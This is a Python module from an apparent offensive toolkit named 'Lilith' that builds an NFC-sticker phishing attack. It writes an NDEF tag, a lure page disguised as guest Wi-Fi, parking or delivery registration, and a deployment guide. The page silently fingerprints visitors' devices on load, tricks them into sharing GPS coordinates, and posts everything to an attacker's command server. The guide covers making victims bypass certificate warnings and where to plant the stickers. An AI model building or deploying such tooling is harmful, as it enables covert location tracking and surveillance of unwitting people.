"""
Lilith — NFC passive recon: tag → lure page → silent device fingerprint + GPS

Attack chain:
  1. lilith build --nfc-recon [--nfc-recon-theme wifi|parking|delivery]
  2. Write tag.ndef to NFC sticker (NFC Tools app, ndeftool, Flipper)
  3. Place sticker at target location
  4. Victim taps → browser opens collect.html:
       Phase A (instant, no interaction): UA, screen, timezone, language,
         network type, battery, hardware concurrency, memory → POST /collect
       Phase B (button press + GPS permission): full device profile + GPS
         coordinates → POST /collect
  5. C2 server logs both phases to console + EngagementDB

Files generated:
  nfc/tag.ndef           — NDEF URI record pointing to collect.html
  nfc/collect.html       — lure page (served by lilith serve from workspace)
  nfc/nfc_recon_guide.txt
"""

import os
import secrets
import struct

from .nfc_tag import _ndef_uri_record, _ndef_message_tlv

_THEMES = {
    "wifi": {
        "title":           "Guest Wi-Fi Access",
        "icon":            "📶",
        "heading":         "Guest Network Registration",
        "body":            "Register your device to access the guest Wi-Fi network. This is required by IT policy for compliance purposes.",
        "btn":             "Connect to Guest Wi-Fi",
        "gps_ctx":         "Your location is required to verify you are on-premises.",
        "success_heading": "Connected Successfully",
        "success_body":    "Your device is now registered. You will be connected to the guest network within 60 seconds.",
        "footer":          "Secured by Azure AD &bull; IT Department",
    },
    "parking": {
        "title":           "Parking Entry Registration",
        "icon":            "🚗",
        "heading":         "Vehicle Entry Portal",
        "body":            "Register your vehicle to complete your parking entry. This is required by site management for all visitors.",
        "btn":             "Register My Vehicle",
        "gps_ctx":         "Location verification confirms you are at the registered facility.",
        "success_heading": "Registration Complete",
        "success_body":    "Your vehicle entry has been logged. Barrier will open automatically. Valid for 8 hours.",
        "footer":          "Parking Management System &bull; Site Operations",
    },
    "delivery": {
        "title":           "Delivery Confirmation",
        "icon":            "📦",
        "heading":         "Package Delivery Portal",
        "body":            "A package is awaiting delivery at your address. Tap below to confirm you are available and provide a delivery signature.",
        "btn":             "Confirm & Sign for Delivery",
        "gps_ctx":         "Location is required to confirm you are at the delivery address.",
        "success_heading": "Delivery Confirmed",
        "success_body":    "Your electronic signature has been recorded. Your delivery is on its way. ETA: 1–2 hours.",
        "footer":          "Delivery Tracking System &bull; Logistics",
    },
}


def _collect_html(collect_url: str, theme: str) -> str:
    t = _THEMES.get(theme, _THEMES["wifi"])
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>{t['title']}</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,sans-serif;
     background:#f0f4f8;min-height:100vh;display:flex;align-items:center;
     justify-content:center;padding:20px}}
.card{{background:#fff;border-radius:16px;padding:36px 24px;max-width:400px;
       width:100%;box-shadow:0 4px 24px rgba(0,0,0,.12);text-align:center}}
.icon{{font-size:60px;margin-bottom:16px;display:block}}
h1{{font-size:20px;font-weight:700;color:#111;margin-bottom:10px;line-height:1.3}}
.body-text{{color:#555;font-size:14px;line-height:1.65;margin-bottom:6px}}
.gps-ctx{{color:#888;font-size:12px;margin-bottom:22px;font-style:italic}}
.btn{{display:block;background:#0071e3;color:#fff;padding:16px;border-radius:12px;
      font-size:16px;font-weight:600;border:none;width:100%;cursor:pointer;
      margin-bottom:14px;-webkit-tap-highlight-color:transparent}}
.btn:active{{background:#0062c4;transform:scale(.98)}}
.spinner{{display:none;margin:20px auto;width:36px;height:36px;
          border:3px solid #e0e0e0;border-top-color:#0071e3;
          border-radius:50%;animation:spin .75s linear infinite}}
@keyframes spin{{to{{transform:rotate(360deg)}}}}
.ok{{display:none;padding-top:8px}}
.ok .check{{font-size:64px;margin:10px 0}}
.ok h2{{color:#1d7340;font-size:18px;font-weight:700;margin-bottom:8px}}
.ok p{{color:#555;font-size:14px;line-height:1.6}}
.footer{{font-size:11px;color:#bbb;margin-top:16px}}
</style>
</head>
<body>
<div class="card">
  <span class="icon">{t['icon']}</span>
  <h1>{t['heading']}</h1>
  <p class="body-text">{t['body']}</p>
  <p class="gps-ctx">{t['gps_ctx']}</p>
  <button class="btn" id="btn" onclick="doCollect()">{t['btn']}</button>
  <div class="spinner" id="spin"></div>
  <div class="ok" id="ok">
    <div class="check">&#10003;</div>
    <h2>{t['success_heading']}</h2>
    <p>{t['success_body']}</p>
  </div>
  <div class="footer">{t['footer']}</div>
</div>
<script>
var D={{}};

function _base(){{
  D.ua       = navigator.userAgent||'';
  D.platform = navigator.platform||'';
  D.vendor   = navigator.vendor||'';
  D.lang     = navigator.language||'';
  D.langs    = (navigator.languages||[]).join(',');
  D.tz       = Intl.DateTimeFormat().resolvedOptions().timeZone||'';
  D.tzoff    = new Date().getTimezoneOffset();
  D.sw=screen.width; D.sh=screen.height; D.dpr=window.devicePixelRatio||1;
  D.cd       = screen.colorDepth||0;
  D.mem      = navigator.deviceMemory||null;
  D.cores    = navigator.hardwareConcurrency||null;
  D.touch    = navigator.maxTouchPoints||0;
  D.cookies  = navigator.cookieEnabled;
  D.online   = navigator.onLine;
  D.ref      = document.referrer||'';
  D.w        = window.innerWidth; D.h = window.innerHeight;
  var c = navigator.connection||navigator.mozConnection||navigator.webkitConnection;
  if(c){{D.net_type=c.effectiveType||''; D.net_dl=c.downlink||null;
         D.net_rtt=c.rtt||null; D.net_save=!!c.saveData}}
}}

function _bat(cb){{
  if(navigator.getBattery){{
    navigator.getBattery().then(function(b){{
      D.bat=Math.round(b.level*100);
      D.bat_chg=b.charging;
      D.bat_eta=b.dischargingTime;
      cb();
    }}).catch(cb);
  }} else cb();
}}

function _gps(cb){{
  if(!navigator.geolocation){{cb();return;}}
  navigator.geolocation.getCurrentPosition(
    function(p){{
      D.lat=p.coords.latitude;  D.lon=p.coords.longitude;
      D.acc=p.coords.accuracy;  D.alt=p.coords.altitude;
      D.spd=p.coords.speed;     D.hdg=p.coords.heading;
      cb();
    }},
    function(e){{D.gps_err=e.code; cb();}},
    {{enableHighAccuracy:true, timeout:9000, maximumAge:0}}
  );
}}

function _post(extra){{
  D.ts = new Date().toISOString();
  if(extra) for(var k in extra) D[k]=extra[k];
  var x=new XMLHttpRequest();
  x.open('POST','{collect_url}',true);
  x.setRequestHeader('Content-Type','application/json');
  x.send(JSON.stringify(D));
}}

// Phase A: passive baseline on page load (no button needed)
window.addEventListener('load',function(){{
  _base();
  _bat(function(){{ _post({{phase:'passive'}}); }});
}});

// Phase B: GPS on button press
function doCollect(){{
  document.getElementById('btn').style.display='none';
  document.getElementById('spin').style.display='block';
  _gps(function(){{
    _post({{phase:'active'}});
    document.getElementById('spin').style.display='none';
    document.getElementById('ok').style.display='block';
  }});
}}
</script>
</body>
</html>"""


def _guide(tag_url: str, collect_url: str, theme: str, ndef_path: str) -> str:
    ndef_name = os.path.basename(ndef_path)
    size      = os.path.getsize(ndef_path)
    return f"""\
Lilith NFC Recon tag — deployment guide
══════════════════════════════════════════════════════════════════

Lure theme : {theme}
Tag URL    : {tag_url}
Collect URL: {collect_url}
NDEF file  : {ndef_name}  ({size} bytes)

──────────────────────────────────────────────────────────────────
What gets collected
──────────────────────────────────────────────────────────────────
Phase A — passive (fires immediately on page load, no interaction):
  User-Agent, platform, vendor, language, timezone, UTC offset,
  screen resolution + DPR, color depth, device memory, CPU cores,
  touch points, online status, network type/speed/RTT, battery
  level + charging state, viewport size, cookie status

Phase B — active (fires on button press):
  All of Phase A  +  GPS latitude, longitude, altitude, accuracy,
  speed, heading  (requires user to tap Allow on browser prompt)
  The lure page primes the user to approve the prompt.

──────────────────────────────────────────────────────────────────
Writing the tag
──────────────────────────────────────────────────────────────────
Method 1 — NFC Tools app (fastest):
  Write → Add record → URL/URI → paste:
  {tag_url}

Method 2 — ndeftool (Linux):
  pip install ndeftool nfcpy
  ndeftool write {ndef_name}

Method 3 — Flipper Zero:
  Use qFlipper → write {ndef_name} as NFC dump

──────────────────────────────────────────────────────────────────
Certificate warning
──────────────────────────────────────────────────────────────────
Lilith uses a self-signed TLS certificate. Mobile browsers will
show a "Your connection is not private" warning. Add to label:
  "If prompted for a certificate warning, tap Advanced → Proceed"
OR use a real domain + Let's Encrypt cert pointed to this server
for a completely seamless victim experience.

──────────────────────────────────────────────────────────────────
Placement ideas
──────────────────────────────────────────────────────────────────
  wifi     : on a wall-mounted Wi-Fi AP, under a router, on a
             conference room display ("Tap to join guest network")
  parking  : on a barrier control box, parking meter, entry sign
  delivery : on a building entrance, mailroom door, reception desk

──────────────────────────────────────────────────────────────────
C2 must be running when victim taps:
  lilith serve
──────────────────────────────────────────────────────────────────
"""


def build_nfc_recon_payload(
    tag_url:     str,
    collect_url: str,
    output_dir:  str,
    theme:       str = "wifi",
) -> bool:
    """Generate NFC recon tag + lure collection page.

    tag_url     : full URL encoded in the NFC tag (browser opens this page)
    collect_url : full URL the lure page POSTs device data to
    output_dir  : directory to write files into
    theme       : wifi | parking | delivery
    """
    if theme not in _THEMES:
        theme = "wifi"

    os.makedirs(output_dir, exist_ok=True)

    # NDEF tag binary
    record    = _ndef_uri_record(tag_url)
    tlv       = _ndef_message_tlv(record)
    ndef_path = os.path.join(output_dir, "tag.ndef")
    with open(ndef_path, "wb") as f:
        f.write(tlv)

    # Lure page (served by lilith serve)
    html      = _collect_html(collect_url, theme)
    html_path = os.path.join(output_dir, "collect.html")
    with open(html_path, "w", encoding="utf-8") as f:
        f.write(html)

    # Deployment guide
    guide     = _guide(tag_url, collect_url, theme, ndef_path)
    txt_path  = os.path.join(output_dir, "nfc_recon_guide.txt")
    with open(txt_path, "w", encoding="utf-8") as f:
        f.write(guide)

    print(f"[+] {ndef_path}  ({len(tlv)} bytes — NDEF URI)")
    print(f"[+] {html_path}  (lure page, serve via: lilith serve)")
    print(f"[+] {txt_path}")
    print()
    print(f"[*] Theme      : {theme}")
    print(f"[*] Tag URL    : {tag_url}")
    print(f"[*] Collect URL: {collect_url}")
    print()
    print(f"[*] Phase A (passive): UA + screen + timezone + network + battery")
    print(f"[*] Phase B (button) : + GPS lat/lon/alt/accuracy")
    print()
    print(f"[*] Write tag: NFC Tools app → Write → URL → paste tag URL")
    print(f"               OR: ndeftool write {ndef_path}")
    print(f"[*] lilith serve must be running when victim taps")

    return True
